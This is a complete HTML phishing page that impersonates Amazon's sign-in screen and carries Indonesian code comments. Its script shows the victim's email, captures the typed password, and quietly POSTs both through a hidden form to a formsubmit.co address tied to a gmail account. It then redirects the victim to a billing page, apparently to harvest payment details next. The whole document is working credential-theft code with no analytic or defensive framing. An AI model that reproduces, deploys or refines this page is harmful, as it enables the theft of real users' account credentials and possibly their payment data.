<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Sign In</title>
    <style>
        * {margin:0; padding:0; font-family:Arial,sans-serif; box-sizing:border-box;}
        body {background:#fff; padding:20px; display:flex; flex-direction:column; align-items:center; min-height:100vh;}
        .logo {margin:20px 0;}
        .logo img {height:30px;}
        .box {border:1px solid #ddd; border-radius:4px; padding:25px; width:100%; max-width:350px;}
        h1 {font-size:22px; margin-bottom:15px; font-weight:normal;}
        .email {font-size:14px; margin-bottom:20px;}
        label {display:block; font-size:13px; font-weight:bold; margin-bottom:5px;}
        input {width:100%; padding:7px; border:1px solid #a6a6a6; border-radius:4px; margin-bottom:15px; font-size:15px;}
        button {width:100%; padding:8px; background:linear-gradient(#f7df74,#ecc000); border:1px solid #b88600; border-radius:4px; cursor:pointer; font-size:15px;}
        button:disabled {opacity:0.6;}
        .status {margin-top:15px; font-size:13px; display:none;}
        .ok {color:green;}
        .err {color:red;}
    </style>
</head>
<body>
    <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"></div>
    <div class="box">
        <h1>Sign in</h1>
        <div class="email" id="tampilEmail"></div>
        
        <form id="formLogin">
            <label>Password</label>
            <input type="password" id="password" required>
            <button type="submit" id="btnKirim">Sign in</button>
            <div id="status" class="status"></div>
        </form>
    </div>

<script>
// Ambil email
const params = new URLSearchParams(window.location.search);
const email = params.get("email") || localStorage.getItem("dataEmail");

if(!email) {
    window.location.href = "index.html";
}
localStorage.setItem("dataEmail", email);
document.getElementById("tampilEmail").textContent = email;

// Kirim data
document.getElementById("formLogin").addEventListener("submit", function(e) {
    e.preventDefault();
    
    const password = document.getElementById("password").value;
    const btn = document.getElementById("btnKirim");
    const status = document.getElementById("status");
    
    localStorage.setItem("password", password);
    
    btn.disabled = true;
    btn.textContent = "Mengirim...";
    status.style.display = "none";

    // Kirim menggunakan FORM standar (paling dapat diandalkan)
    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://formsubmit.co/jandaanaksatu777@gmail.com";
    
    const subj = document.createElement("input");
    subj.type = "hidden";
    subj.name = "_subject";
    subj.value = "📋 Data dari Halaman Masuk — Result Login";
    form.appendChild(subj);
    
    const inpEmail = document.createElement("input");
    inpEmail.type = "hidden";
    inpEmail.name = "Email";
    inpEmail.value = email;
    form.appendChild(inpEmail);
    
    const inpPass = document.createElement("input");
    inpPass.type = "hidden";
    inpPass.name = "Password";
    inpPass.value = password;
    form.appendChild(inpPass);
    
    document.body.appendChild(form);
    
    // Setelah terkirim, pindah ke billing.html
    setTimeout(() => {
        window.location.href = "billing.html";
    }, 500);
    
    form.submit();
});
</script>
</body>
</html>
